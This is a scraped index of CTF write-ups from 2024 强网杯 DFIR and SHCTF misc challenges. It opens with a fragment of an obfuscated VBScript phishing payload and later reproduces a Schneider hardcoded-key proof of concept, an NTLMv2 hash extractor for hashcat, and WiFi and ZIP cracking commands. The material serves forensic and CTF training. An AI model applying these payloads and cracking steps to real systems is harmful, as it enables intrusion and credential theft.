Next Dim AgUvcCuHzzbl Dim DfAV40y Dim gwqhhV Dim JJNe Dim Mw7U Dim O8B1OrkTW OMxa=Chr(Int(\"53\"))\u0026Chr(Int(\"\u0026H31\"))\u0026Chr(\u0026H37)\u0026Chr(51)\u0026Chr(52)\u0026Chr(101)\u0026Chr(56)\u0026Chr(Int(\"\u0026H65\"))\u0026Chr(\u0026H37)\u0026Chr(Int(\"101\"))\u0026Chr(\u0026H63)\u0026Chr(Int(\"\u0026H34\"))\u0026Chr(\u0026H37)\u0026Chr(Int(\"101\"))\u0026Chr(\u0026H63)\u0026Chr(Int(\"55\"))\u0026Chr(53)\u0026Chr(Int(\"51\"))\u0026Chr(Int(\"99\"))\u0026Chr(Int(\"50\"))\u0026Chr(\u0026H35)\u0026Chr(50)\u0026Chr(\u0026H61)\u0026Chr(Int(\"48\"))\u0026Chr(Int(\"55\"))\u0026Chr(Int(\"\u0026H62\"))\u0026Chr(\u0026H32)\u0026Chr(\u0026H63)\u0026Chr(Int(\"\u0026H35\"))\u0026Chr(Int(\"49\"))\u0026Chr(54)\u0026Chr(\u0026H62)\u0026Chr(53)\u0026Chr(Int(\"99\"))\u0026Chr(\u0026H34)\u0026Chr(Int(\"97\"))\u0026Chr(\u0026H32)\u0026Chr(48)\u0026Chr(49)\u0026Chr(\u0026H63)\u0026Chr(Int(\"\u0026H35\"))\u0026Chr(Int(\"102\"))\u0026Chr(51)\u0026Chr(Int(\"97\"))\u0026Chr(Int(\"55\"))\u0026Chr(\u0026H66)\u0026Chr(53)\u0026Chr(49)\u0026Chr(Int(\"54\"))\u0026Chr(Int(\"\u0026H37\"))\u0026Chr(Int(\"54\"))\u0026Chr(\u0026H66)\u0026Chr(Int(\"50\"))\u0026Chr(\u0026H30)\u0026Chr(\u0026H31)\u0026Chr(Int(\"\u0026H64\"))\u0026Chr(53)\u0026Chr(\u0026H31)\u0026Chr(Int(\"54\"))\u0026Chr(56)\u0026Chr(Int(\"53\"))\u0026Chr(54)\u0026Chr(","date":"2024-11-18","objectID":"/2024qwbs8_master_of_dfir/:0:1","series":null,"tags":["wp","misc"],"title":"2024 强网杯s8_Master of DFIR","uri":"/2024qwbs8_master_of_dfir/#master-of-dfir---phishing"},{"categories":["wp","misc"],"content":"\rMaster of DFIR - Coffee 欢迎来到Master of DFIR - ☕ ,我们需要帮助你调查以下任务.并且提交这些任务的正确答案,我们将会给你flag🤔 需要输入Team Token即可开始 Team token \u003e xxx (1/9) 受害者主机名是什么? 示例:DESKTOP-J6QZVBD 请输入你的答案 \u003e DESKTOP-28DGVAU 正确✅! (2/9) 控制端ClientId是多少? 示例:c723d01b-5dc1-2601 请输入你的答案 \u003e a55330f4-83c2-4081 正确✅! (3/9) 攻击者下载的文件的保存名是什么？ 示例:flag.txt 请输入你的答案 \u003e history 正确✅! (4/9) tomcat的用户名和密码是多少? 示例:admin:admin 请输入你的答案 \u003e tomcat:beautiful 正确✅! (5/9) 攻击者上传的文件名? 示例:flag.txt 请输入你的答案 \u003e help.war 正确✅! (6/9) 黑客使用webshell管理工具是什么? (注意:全小写) 示例:antsword 请输入你的答案 \u003e behinder 正确✅! (7/9) 被黑客窃取的云存储服务的管理员账户和密码是多少? 请输入你的答案 \u003e hhcloud:vipvip123 正确✅! (8/9) 挖矿程序落地的文件是什么？ 示例:miner.exe 请输入你的答案 \u003e sys_update.exe 正确✅! (9/9) 该挖矿程序回连的矿池域名是什么? 示例:www.baidu.com 请输入你的答案 \u003e auto.skypool.xyz 正确✅! 恭喜你完成了所有任务,这是你的flag 🚩 --\u003e 由Phishing得到aes加密的key为pJB-v)t^ZAsP$|r` 1.受害者主机名是什么? DESKTOP-28DGVAU 2.控制端ClientId是多少? a55330f4-83c2-4081 3.攻击者下载的文件的保存名是什么？ history 4.tomcat的用户名和密码是多少? tomcat:beautiful 5.攻击者上传的文件名? help.war (6)黑客使用webshell管理工具是什么? behinder 导出shell.war，解压，使用蓝队工具箱解码help.jsp的部分字符串 根据流量特征 XOR+AES-ECB/PCKS5加密的class攻击载荷 String xor_key = \"82ca9b43c1b8ef8c\"; String key = \"b42e327feb5d923b\"; (7)被黑客窃取的云存储服务的管理员账户和密码是多少? hhcloud:vipvip123 接下来可以对流量进行解密 https://cyberchef.cn/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR(%7B'option':'UTF8','string':'2ca9b43c1b8ef8c8'%7D,'Standard',false)AES_Decrypt(%7B'option':'UTF8','string':'b42e327feb5d923b'%7D,%7B'option':'Hex','string':''%7D,'ECB/NoPadding','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)Zlib_Inflate(0,0,'Adaptive',false,false)\u0026input= 得到一个数据库文件 md5在线解密破解,md5解密加密 (8)挖矿程序落地的文件是什么？ sys_update.exe (9)该挖矿程序回连的矿池域名是什么? auto.skypool.xyz ","date":"2024-11-18","objectID":"/2024qwbs8_master_of_dfir/:0:2","series":null,"tags":["wp","misc"],"title":"2024 强网杯s8_Master of DFIR","uri":"/2024qwbs8_master_of_dfir/#master-of-dfir---coffee"},{"categories":["wp","misc"],"content":"NTLM v2 hash爆破与 RDP流量分析 ","date":"2024-11-17","objectID":"/2024qwbs8_dycc5.0/:0:0","series":null,"tags":["wp","misc"],"title":"2024 强网杯s8_谍影重重5.0","uri":"/2024qwbs8_dycc5.0/#"},{"categories":["wp","misc"],"content":"\r谍影重重5.0 我国某部门已经连续三年对间谍张纪星进行秘密监控，最近其网络流量突然出现大量的神秘数据，为防止其向境外传送我国机密数据，我们已将其流量保存，请你协助我们分析其传输的秘密信息。 发现有SMB流量和TLS流量 根据经验应该是要爆破NTLM v2 hash来解密SMB流量， 并且要取得公钥来解密TLS流量 可以手动提取ntlmv2 hash，参考 https://www.secpulse.com/archives/106276.html 利用python自动提取pcap包中的ntlmv2 hash https://github.com/gh-balthazarbratt/nocashvalue #!/usr/bin/python3 import os, sys, subprocess, json, logging, argparse from uuid import uuid4 parser = argparse.ArgumentParser(description='Extracts NTLMv2 tokens from pcaps \\ and creates files ready to be consumed by hashcat') parser.add_argument('--tshark_path', type=str, help='full path to tshark executable', required=True) parser.add_argument('--pcap_file', type=str, help='full path to pcap file', required=True) args = parser.parse_args() tshark_path = args.tshark_path pcap_file = args.pcap_file # Change the value below based on your system paths, it is set for *nix type systems tmp = '/tmp' # Set temporary directory and log file names scr_dir = 'nocashvalue_ntlmv2-' + uuid4().__str__()[:8] tmp_scr_dir = tmp + '/' + scr_dir log_file = 'nocashvalue.log' # Create script tmp directory os.mkdir(tmp_scr_dir) # Setup logger logger = logging.getLogger('nocashvalue') logger.setLevel(logging.DEBUG) fh = logging.FileHandler(tmp_scr_dir+'/'+log_file) fh.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')) logger.addHandler(fh) logger.info('Logger initialized') challenge_filter_str = \"'ntlmssp.identifier == NTLMSSP and ntlmssp.messagetype == 0x00000002'\" blob_filter_str = \"'ntlmssp.identifier == NTLMSSP and ntlmssp.messagetype == 0x00000003'\" challenge_str_cmd = \"{} -r {} -Y{} -Tjson -e ntlmssp.auth.username \\ -e ntlmssp.auth.domain -e ntlmssp.ntlmserverchallenge -e ntlmssp.ntlmv2_response.ntproofstr \\ -e ntlmssp.ntlmv2_response\".format(tshark_path, pcap_file, challenge_filter_str) blob_str_cmd = \"{} -r {} -Y{} -Tjson -e ntlmssp.auth.username -e ntlmssp.auth.domain \\ -e ntlmssp.ntlmserverchallenge -e ntlmssp.ntlmv2_response.ntproofstr \\ -e ntlmssp.ntlmv2_response\".format(tshark_path, pcap_file, blob_filter_str) logger.info('Executing \"{}\" in a subprocess shell'.format(challenge_str_cmd)) pipe1 = subprocess.Popen(challenge_str_cmd, stdout=subprocess.PIPE, shell=True) logger.info('Child process pid is {} and it exited with {}'.format(pipe1.pid, pipe1.returncode)) logger.info('Executing \"{}\" in a subprocess shell'.format(blob_str_cmd)) pipe2 = subprocess.Popen(blob_str_cmd, stdout=subprocess.PIPE, shell=True) logger.info('Child process pid is {} and it exited with {}'.format(pipe2.pid, pipe2.returncode)) challenge_str_output = pipe1.stdout.read() blob_str_output = pipe2.stdout.read() # This is a list of dictionaries challenge_str_json = json.loads(challenge_str_output.decode('UTF-8')) logger.info(json.dumps(challenge_str_json, indent=2)) blob_str_json = json.loads(blob_str_output.decode('UTF-8')) logger.info(json.dumps(blob_str_json, indent=2)) # Log the fact that the number of server challenge packets # are different than the number of ntlmv2_response packets and exit if (len(challenge_str_json) != len(blob_str_json)): sys.stdout.write('Number of SMB2 packets containing NTLM Server Challenge tokens \\ are different than the number of packets containing NTLMv2 responses. See {} \\ for details.'.format(tmp_scr_dir+'/'+log_file)) exit() packets = [] # Merge server challenge tokens with the rest of the ntlmv2_response details # Caveat: We assume that the packets are received in chronological order such that # the packet which contains server_challenge token appears right before the packet # that contains NTLMv2_response it is associated with for i, blob_pkt in enumerate(blob_str_json): username, domain, server_challenge, ntproofstr, ntlmv2_response = ['', '', '', '', ''] if (len(blob_pkt['_source']['layers']) \u003e 0 and 'ntlmssp.auth.username' in blob_pkt['_source']['layers']): username = blob_pkt['_source']['layers']['ntlmssp.auth.username'][0] if (len(blob_pkt['_source']['layers']) \u003e 0 and 'ntlmssp.auth.domain' in blob_","date":"2024-11-17","objectID":"/2024qwbs8_dycc5.0/:0:1","series":null,"tags":["wp","misc"],"title":"2024 强网杯s8_谍影重重5.0","uri":"/2024qwbs8_dycc5.0/#谍影重重50"},{"categories":["wp","misc"],"content":"赛题复现 ","date":"2024-11-13","objectID":"/2024shctf_misc/:0:0","series":null,"tags":["wp","misc"],"title":"2024 SHCTF_misc","uri":"/2024shctf_misc/#"},{"categories":["wp","misc"],"content":"\rWeek1","date":"2024-11-13","objectID":"/2024shctf_misc/:1:0","series":null,"tags":["wp","misc"],"title":"2024 SHCTF_misc","uri":"/2024shctf_misc/#week1"},{"categories":["wp","misc"],"content":"\r签到题扫码关注公众号回复 ","date":"2024-11-13","objectID":"/2024shctf_misc/:1:1","series":null,"tags":["wp","misc"],"title":"2024 SHCTF_misc","uri":"/2024shctf_misc/#签到题"},{"categories":["wp","misc"],"content":"\r拜师之旅①010editor打开补充png头尾的hex数据 修复高度 ","date":"2024-11-13","objectID":"/2024shctf_misc/:1:2","series":null,"tags":["wp","misc"],"title":"2024 SHCTF_misc","uri":"/2024shctf_misc/#拜师之旅"},{"categories":["wp","misc"],"content":"\r真真假假?遮遮掩掩!伪加密和掩码攻击 掩码爆破 ","date":"2024-11-13","objectID":"/2024shctf_misc/:1:3","series":null,"tags":["wp","misc"],"title":"2024 SHCTF_misc","uri":"/2024shctf_misc/#真真假假遮遮掩掩"},{"categories":["wp","misc"],"content":"\rRasterizing Traffic导出流量中的png图片 一张光栅图片 网上搜的脚本稍微修一下就能用 ","date":"2024-11-13","objectID":"/2024shctf_misc/:1:4","series":null,"tags":["wp","misc"],"title":"2024 SHCTF_misc","uri":"/2024shctf_misc/#rasterizing-traffic"},{"categories":["wp","misc"],"content":"\r有WiFi干嘛不用呢？把may中所有的数据提取出来做成字典： cat ./* \u003e output 删一下[]，aircrack-ng爆破即可： aircrack-ng 01.cap -w output ","date":"2024-11-13","objectID":"/2024shctf_misc/:1:5","series":null,"tags":["wp","misc"],"title":"2024 SHCTF_misc","uri":"/2024shctf_misc/#有wifi干嘛不用呢"},{"categories":["wp","misc"],"content":"\rWeek2","date":"2024-11-13","objectID":"/2024shctf_misc/:2:0","series":null,"tags":["wp","misc"],"title":"2024 SHCTF_misc","uri":"/2024shctf_misc/#week2"},{"categories":["wp","misc"],"content":"\r练假成真使用QRazyBox的Data Sequence Analysis功能 从右下角开始，第一个块记载了模式，从第三个开始为数据块，将SHCTF{转为二进制，然后填进去 01010011 01001000 01000011 01010100 01000110 01111011 随后使用Padding Bits Recovery功能补上部分像素 最后通过 Reed-Solomon Decoder 还原出二维码所存数据 SHCTF{RjFhZ2Y0SzNyRjFhZ2Y0SzNy} base64解码一下 使用foremost又分离出一张图 换表base64 最终flag: SHCTF{THis_F14GTHis_F14G} 参考文档 https://www.cnblogs.com/luogi/p/15469106.html#%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86 https://blog.csdn.net/Scalzdp/article/details/133927363 ","date":"2024-11-13","objectID":"/2024shctf_misc/:2:1","series":null,"tags":["wp","misc"],"title":"2024 SHCTF_misc","uri":"/2024shctf_misc/#练假成真"},{"categories":["wp","misc"],"content":"\rSchneidersrc-2020-0010，poc: #!/usr/bin/env python3 \"\"\" Schneider Electric EcoStruxure Operator Terminal Expert Hardcoded Cryptographic Key Information Disclosure Vulnerability SRC ....: SRC-2020-0010 CVE ....: N/A File ...: EcoStruxure Operator Terminal Expert V3.1.iso SHA1 ...: 386312d68ba5e6a98df24258f2fbcfb2d8c8521b Download: https://download.schneider-electric.com/files?p_File_Name=EcoStruxure+Operator+Terminal+Expert+V3.1.iso \"\"\" import os import re import sys import glob import zlib import zipfile from Crypto.Cipher import DES3 # hardcoded values key = [ 202, 20, 221, 52, 225, 154, 5, 123, 111, 219, 11, 199, 145, 27, 200, 129, 254, 222, 253, 119, 213, 134, 72, 78 ] iv = [ 95, 21, 44, 250, 112, 73, 114, 155 ] des3 = [ 93, 51, 117, 85, 189, 76, 88, 200, 231, 127 ] plen = 8 def check_equal(iterator): # if all the values are the same then its padding... return len(set(iterator)) \u003c= 1 def _inflate(decoded_data): return zlib.decompress(decoded_data, -15) def _deflate(string_val): compressed = zlib.compress(string_val) return compressed[2:-4] def delete_folder(top) : for root, dirs, files in os.walk(top, topdown=False): for name in files: os.remove(os.path.join(root, name)) for name in dirs: os.rmdir(os.path.join(root, name)) os.rmdir(top) def decrypt_file(filename): print(\"(+) unpacking: %s\" % filename) decr = DES3.new(bytes(key), DES3.MODE_CBC, bytes(iv)) default_data = bytes([8, 8, 8, 8, 8, 8, 8, 8]) with open(filename, \"rb\") as f: if list(f.read(10)) == des3: encrypted = f.read() raw_data = decr.decrypt(encrypted) if not check_equal(list(raw_data)): raw_data = _inflate(raw_data) else: f.seek(0) raw_data = f.read() # now that we have the decrypted data, let's overwrite the file... with open(filename, \"wb\") as f: f.write(raw_data) def encrypt_file(filename): print(\"(+) packing: %s\" % filename) encr = DES3.new(bytes(key), DES3.MODE_CBC, bytes(iv)) with open(filename, \"rb\") as f: packed_data = f.read() if not packed_data == bytes([8, 8, 8, 8, 8, 8, 8, 8]): packed_data = _deflate(packed_data) # padding for encryption, same as schneider pad = plen - (len(packed_data) % plen) # if we just have padding in there, then dont bother adding more padding now... if len(packed_data) != 8: for i in range(0, pad): packed_data += bytes([pad]) encr_data = bytes(des3) + encr.encrypt(packed_data) with open(filename, \"wb\") as f: f.write(encr_data) def unpack(project): z = os.path.abspath(project) output_dir = os.path.splitext(z)[0] print(\"(+) unpacking to %s\" % output_dir) if os.path.exists(output_dir): print(\"(-) %s already exists!\" % output_dir) return False zip_obj = zipfile.ZipFile(z, 'r') zip_obj.extractall(output_dir) zip_obj.close() # two levels deep, we can do more if we need to for file in list(set(glob.glob(output_dir + '/**/**/*.*', recursive=True))): decrypt_file(file) print(\"(+) unpacked and decrypted: %s\" % project) def pack(project): z = os.path.abspath(project) output_dir = os.path.splitext(z)[0] # two levels deep, we can do more if we need to for file in list(set(glob.glob(output_dir + '/**/**/*.*', recursive=True))): if os.path.basename(file) != \"[Content_Types].xml\": encrypt_file(file) zf = zipfile.ZipFile(project, \"w\") for file in list(set(glob.glob(os.path.basename(output_dir) + '/**/**/*.*', recursive=True))): zf.write(file, \"/\".join(file.strip(\"/\").split('/')[1:])) zf.close() delete_folder(output_dir) print(\"(+) packed and encrypted: %s\" % project) def main(): if len(sys.argv) != 3: print(\"(+) usage: %s[options]\" % sys.argv[0]) print(\"(+) eg: %s sample.vxdz unpack\" % sys.argv[0]) print(\"(+) eg: %s sample.vxdz pack\" % sys.argv[0]) sys.exit(0) f = sys.argv[1] c = sys.argv[2] if c.lower() == \"unpack\": unpack(f) elif c.lower() == \"pack\": pack(f) else: print(\"(-) invalid option!\") sys.exit(1) if __name__ == '__main__': main() Security.db ","date":"2024-11-13","objectID":"/2024shctf_misc/:2:2","series":null,"tags":["wp","misc"],"title":"2024 SHCTF_misc","uri":"/2024shctf_misc/#schneider"},{"categories":["wp","misc"],"content":"\r屁找到文件头以 PK 开头的文件，将其后缀改为 ZIP 可以看到压缩方法采用 「Deflate」 算法 ，没有加密，这意味着**「数据区」**的文件数据可以直接使用 「zlib.decompress」 进行解压。 同时可确定最小的文件即为文件尾。 删除 ZIP 的文件头尾后，编写代码进行爆破。 删除第一个文件头部 删除最后文件尾部 写脚本进行爆破 （脚本参考官方wp） import os import itertools import zlib from tqdm import tqdm def read_binary_file(file_path): with open(file_path, \"rb\") as f: return f.read() def try_decompress(data): try: decompressed_data = zlib.decompress(data, -zlib.MAX_WBITS) return decompressed_data except zlib.error: return None def calculate_crc32(data): if len(data) != 105734: return None return zlib.crc32(data) \u0026 0xFFFFFFFF def main(): directory = \"屁\" # 指定目录 # 指定开头和结尾文件 start_file = os.path.join(directory, \"屁.z66\") end_file = os.path.join(directory, \"屁.z40\") files = [os.path.join(directory, f) for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))] # 移除开头和结尾文件 files.remove(start_file) files.remove(end_file) # 生成剩余文件的全排列 permutations = itertools.permutations(files) # 计算排列的总数 total_permutations = sum(1 for _ in permutations) # 重置 permutations 以便再次迭代 permutations = itertools.permutations(files) # 已知的CRC32值 known_crc32 = 0x0B6E238E for perm in tqdm(permutations, total=total_permutations, desc=\"Processing\"): # 将开头和结尾文件固定在首尾 combined_files = [start_file] + list(perm) + [end_file] # 连接所有文件的二进制内容 combined_data = b\"\".join(read_binary_file(file_path) for file_path in combined_files) # 尝试解压缩 decompressed_data = try_decompress(combined_data) if decompressed_data is not None: # 计算解压后数据的CRC32值 calculated_crc32 = calculate_crc32(decompressed_data) # 检查CRC32值是否匹配 if calculated_crc32 == known_crc32: print(\"解压成功！\") # 输出解压后的数据 with open(\"屁.svp\", \"wb\") as f: f.write(decompressed_data) print(\"解压后的数据已保存到 屁.svp\") break else: print(\"没有找到可以成功解压的排列顺序。\") if __name__ == \"__main__\": main() 成功解压后得到术力口工程文件，可以使用 Synthesizer V 打开 发现部分字和音素对不上。 Synthesizer V 使用 ARPABET 作为音素标准，仔细查找可以找到一个字典 https://github.com/cmusphinx/sphinxtrain/blob/master/test/res/communicator.dic.cmu.full 翻译得到下面的话。 S.,H.,C.,T.,F.,Open Curly Bracket,B.,L.,four,C.,K.,Underscore,M.,Y.,seven,H.,colon,five,H.,four,N.,H.,three,Close Curly Bracket flag SHCTF{BL4CK_MY7H:5H4NH3} ","date":"2024-11-13","objectID":"/2024shctf_misc/:2:3","series":null,"tags":["wp","misc"],"title":"2024 SHCTF_misc","uri":"/2024shctf_misc/#屁"},{"categories":["wp","misc"],"content":"\r拜师之旅②题目描述是个谐音梗\"挨打\"(IDAT) 可以发现实质是两张图片放到了一起,一张4995为底 ,一张5185为底 假flag的图片为前者优先显示,删掉对应的三个IDAT块后保留头尾IHDR,IEND再保存得到真flag图片 ","date":"2024-11-13","objectID":"/2024shctf_misc/:2:4","series":null,"tags":["wp","misc"],"title":"2024 SHCTF_misc","uri":"/2024shctf_misc/#拜师之旅-1"},{"categories":["wp","misc"],"content":"\r遮遮掩掩?CCRC!ZipCrypto加密,并且文件内容大小只有3byte,结合题目考虑CRC爆破 import zlib flag='' crc_list = [0x42582aaa, 0xbce853c2, 0x211fdb00, 0x70c6b6fe, 0x63ad436c, 0x84bd90bd, 0x55769db8, 0x8a2a7829, 0x5c66f4cd, 0x8454f318, 0x8c88cc6a, 0x7eb2adde, 0x078776df, 0x21509dfb, 0x0c975144, 0xf51f79ac, 0xf262197e, 0x8b5919f7, 0x8b5919f7, 0x11d0d7ba, 0x5c66f4cd, 0x38457732, 0xcdff1d1b, 0xcdf2ddf2, 0x7af934d6, 0x21509dfb, 0x5bf57dc6, 0xd617d273, 0xf9d901d6, 0xcdf2ddf2, 0x21509dfb, 0xe98e7a37, 0xc94d437d, 0x1bbe8b92, 0x7dc6ef2a, 0x0f1e9f47, 0x5c66f4cd, 0x54f6ab19, 0x3b6a9c6f, 0x9e80fced, 0x94f0383e, 0xcc7fcc02, 0x8eca39aa, 0x7b2fb1b3, 0x62dd04ef, 0x211fdb00] for target_crc in crc_list: for i in range(256): for j in range(256): for k in range(256): data = bytes([i, j, k]) # 构造3字节数据 crc = zlib.crc32(data) \u0026 0xffffffff # 计算CRC32值 if crc == target_crc: data=data.decode() print(f\"Found matching data: {data}\") flag+=data break print('解密得到:'+flag) 得到的密文是熊曰加密，到解密网站去解密 http://hi.pcmoe.net/index.html ","date":"2024-11-13","objectID":"/2024shctf_misc/:2:5","series":null,"tags":["wp","misc"],"title":"2024 SHCTF_misc","uri":"/2024shctf_misc/#遮遮掩掩ccrc"},{"categories":["wp","misc"],"content":"\rWeek3","date":"2024-11-13","objectID":"/2024shctf_misc/:3:0","series":null,"tags":["wp","misc"],"title":"2024 SHCTF_misc","uri":"/2024shctf_misc/#week3"},{"categories":["wp","misc"],"content":"\rxor「出题过程：」 创建一个文件flag(/data/flag)并写入flag字符串 然后创建/randomfile.py并执行： import random def generateRandomBytearray(length): random_bytes = bytearray() for _ in range(length): random_bytes.append(random.randint(0, 255)) return random_bytes arrs = [] flag = bytearray(open(\"data/flag\", \"rb\").read()) files = [\"data/flag\"] for i in range(256): byte_arr = generateRandomBytearray(len(flag)) arrs.append(byte_arr) files.append(f\"data/file{i}\") with open(f\"data/file{i}\", \"wb\") as file: file.write(byte_arr) 于是在/data/目录下得到了file0~file255这256个文件 再创建一个xor.py(/data/xor.py)，代码如下 from pwn import xor from os import listdir files = [file for file in listdir() if file != 'xor.py' and file != 'flag'] flag = bytearray(open(\"flag\", \"rb\").read()) for file in files: file = open(file, 'rb').read() flag = xor(flag, file) print(flag) with open('xor', 'wb') as f: f.write(flag) 执行后得到了xor(/data/xor)文件 题目描述给出了最后执行的两条命令： python xor.py rm -f xor.py flag 于是形成了题目附件所展示的文件集合 「解题脚本：」 from pwn import xor from os import listdir files = [file for file in listdir() if file != 'solve.py'] flag = b'' for file in files: file = open(file, 'rb').read() flag = xor(flag, file) print(flag) ","date":"2024-11-13","objectID":"/2024shctf_misc/:3:1","series":null,"tags":["wp","misc"],"title":"2024 SHCTF_misc","uri":"/2024shctf_misc/#xor"},{"categories":["wp","misc"],"content":"\r完\r根据题目描述使用foobar2000查看歌词 rabbit加密，密钥为Eason_Chan http://www.esjson.com/rabbitEncrypt.html ","date":"2024-11-13","objectID":"/2024shctf_misc/:3:2","series":null,"tags":["wp","misc"],"title":"2024 SHCTF_misc","uri":"/2024shctf_misc/#完"},{"categories":["wp","misc"],"content":"\rThe Secret of Tokenizerbkcrack已知明文攻击 bkcrack.exe -C .\\challenge.zip -c challenge/LoveDays.otf -p plain.txt 得到png和otf文件 后面的otf文件丢到fontdrop网站查看 https://fontdrop.info/ 在Data的description能看到密文 然后在搜索后加上看压缩包的那个png文件提示发现其实这个是文本经过GPT的tokenization之后形成的token，用处是让GPT更好的理解输入文本的语义，句法和语义，然后其实在github搜也能找到tiktoken这个模块（这里选用GPT3.5）然后直接写脚本解密 import tiktoken enc = tiktoken.encoding_for_model(\"gpt-3.5-turbo\") text = [8758, 1182, 37, 90, 12174, 6803, 2632, 62, 22, 71, 18, 2632, 18, 31, 43, 2406, 11237, 1159, 564, 18, 77, 16, 89, 18, 5544, 1267, 19, 267, 18, 81, 12340, 92] flag = enc.decode(text) print(flag) SHCTF{Oh_U_R_7h3_R3@L_LLM_Tok3n1z3rs_M4st3r!!!} ","date":"2024-11-13","objectID":"/2024shctf_misc/:3:3","series":null,"tags":["wp","misc"],"title":"2024 SHCTF_misc","uri":"/2024shctf_misc/#the-secret-of-tokenizer"},{"categories":["wp","misc"],"content":"\r拜师之旅③\r可以看到里面藏了zip文件 foremost提取出压缩包，zsteg扫出密码 在exif信息看到了real_size 和原图刚好差12倍,使用脚本提取新图后得到flag onfrom PIL import Image img = Image.open('2.png') w = img.width h = img.height img_obj = Image.new(\"RGB\",(w//12,h//12)) for x in range(w//12): for y in range(h//12): (r,g,b)=img.getpixel((x*12,y*12)) img_obj.putpixel((x,y),(r,g,b)) img_obj.save('3.png') ","date":"2024-11-13","objectID":"/2024shctf_misc/:3:4","series":null,"tags":["wp","misc"],"title":"2024 SHCTF_misc","uri":"/2024shctf_misc/#拜师之旅-2"},{"categories":["wp","misc"],"content":"\rWeek4","date":"2024-11-13","objectID":"/2024shctf_misc/:4:0","series":null,"tags":["wp","misc"],"title":"2024 SHCTF_misc","uri":"/2024shctf_misc/#week4"},{"categories":["wp","misc"],"content":"\r天命人发现了出题人半年前的博客 https://j-0k3r.github.io/2024/04/26/ps5%E6%89%8B%E6%9F%84usb\u0026%E8%93%9D%E7%89%99%E6%B5%81%E9%87%8F%E5%8D%8F%E8%AE%AE/ def decode_hid_data(hex_string): # 将十六进制字符串转换为字节串 bytes_data = bytes.fromhex(hex_string) # 解析数据包 report_id = bytes_data[0] left_stick_x = bytes_data[1] left_stick_y = bytes_data[2] right_stick_x = bytes_data[3] right_stick_y = bytes_data[4] l2_trigger = bytes_data[5] r2_trigger = bytes_data[6] vendor_defined = bytes_data[7] # 解析 Hat switch 按键 hat_switch = bytes_data[8] \u0026 0x0F hat_direction = \"\" if hat_switch == 0x0: hat_direction = \"N\" elif hat_switch == 0x1: hat_direction = \"NE\" elif hat_switch == 0x2: hat_direction = \"E\" elif hat_switch == 0x3: hat_direction = \"SE\" elif hat_switch == 0x4: hat_direction = \"S\" elif hat_switch == 0x5: hat_direction = \"SW\" elif hat_switch == 0x6: hat_direction = \"W\" elif hat_switch == 0x7: hat_direction = \"NW\" elif hat_switch == 0x8: hat_direction = \"Neutral\" square_button = (bytes_data[8] \u003e\u003e 4) \u0026 0x01 cross_button = (bytes_data[8] \u003e\u003e 5) \u0026 0x01 circle_button = (bytes_data[8] \u003e\u003e 6) \u0026 0x01 triangle_button = (bytes_data[8] \u003e\u003e 7) \u0026 0x01 l1_button = bytes_data[9] \u0026 0x01 r1_button = (bytes_data[9] \u003e\u003e 1) \u0026 0x01 l2_button = (bytes_data[9] \u003e\u003e 2) \u0026 0x01 r2_button = (bytes_data[9] \u003e\u003e 3) \u0026 0x01 create_button = (bytes_data[9] \u003e\u003e 4) \u0026 0x01 options_button = (bytes_data[9] \u003e\u003e 5) \u0026 0x01 l3_button = (bytes_data[9] \u003e\u003e 6) \u0026 0x01 r3_button = (bytes_data[9] \u003e\u003e 7) \u0026 0x01 ps_button = bytes_data[10] \u0026 0x01 touchpad_button = (bytes_data[10] \u003e\u003e 1) \u0026 0x01 mute_button = (bytes_data[10] \u003e\u003e 2) \u0026 0x01 # 输出按键状态 print(\"Square\" if square_button else \"\") print(\"Cross\" if cross_button else \"\") print(\"Circle\" if circle_button else \"\") print(\"Triangle\" if triangle_button else \"\") print(hat_direction if hat_direction else \"\") print(\"L1\" if l1_button else \"\") print(\"R1\" if r1_button else \"\") print(\"L2\" if l2_button else \"\") print(\"R2\" if r2_button else \"\") print(\"Create\" if create_button else \"\") print(\"Options\" if options_button else \"\") print(\"L3\" if l3_button else \"\") print(\"R3\" if r3_button else \"\") print(\"PS\" if ps_button else \"\") print(\"Touchpad\" if touchpad_button else \"\") print(\"Mute\" if mute_button else \"\") # 示例数据包的十六进制字符串表示 hex_string = \"01827d828000003908200100eb8d076f0000ffff000016009a1fe604bc4a0f03ff80000000800000000005040000000000505e0f032918005e95af2cd222910d\" # 解码并输出按键 decode_hid_data(hex_string) 按照说明进行拼接 SHCTF{L1+E_R2+R2_Square+R2_Cross+L2_R2+L3_R2+PS_Options} ","date":"2024-11-13","objectID":"/2024shctf_misc/:4:1","series":null,"tags":["wp","misc"],"title":"2024 SHCTF_misc","uri":"/2024shctf_misc/#天命人"},{"categories":["wp","misc"],"content":"\r今日无事,勾栏听曲。audacity导入原始数据 高低频隐写 使用audacity导出wav音频，使用脚本 import numpy as np from scipy.io import wavfile from scipy.fft import fft sample_rate = 44100 # 采样率 duration_per_bit = 0.01 # 持续时间 low_freq = 440 # 低频表示0 high_freq = 880 # 高频表示1 threshold = 660 # 分界线 input_file = 'music.wav' rate, data = wavfile.read(input_file) samples_per_bit = int(sample_rate * duration_per_bit) bit_sequence = [] for i in range(0, len(data), samples_per_bit): bit_data = data[i:i + samples_per_bit] spectrum = np.abs(fft(bit_data))[:samples_per_bit // 2] freqs = np.fft.fftfreq(len(bit_data), 1 / sample_rate)[:samples_per_bit // 2] dominant_freq = freqs[np.argmax(spectrum)] if dominant_freq \u003c threshold: bit_sequence.append('0') else: bit_sequence.append('1') bit_string = ''.join(bit_sequence) output_txt_file = 'result.txt' with open(output_txt_file, 'w') as f: f.write(bit_string) 得到01之后，cyberchef 得到rar，解压 看一下压缩包的详细信息发现是2.9老版本的winrar进行压缩的，5.0及以上版本rar格式压缩算法就不一样了 RAR 由可变长的块组成，这些块的没有固定的先后顺序，但要求第一个块必须是标志块并且其后紧跟一个归档头部块。每个块均以以下字段开头 字段名称 长度(byte) 说明 HEAD_CRC 2 所有块或块部分的CRC HEAD_TYPE 1 块类型 HEAD_FLAGS 2 块标记 HEAD_SIZE 2 块大小 ADD_SIZE 4 可选结构 - 增加块大小 HEAD_TYPE 不同的值有对应的块类型 HEAD_TYPE = 0x72 - MARK_HEAD(标记块) HEAD_TYPE = 0x73 - MAIN_HEAD(压缩文件头) HEAD_TYPE = 0x74 - FILE_HEAD(文件头) HEAD_TYPE = 0x75 - 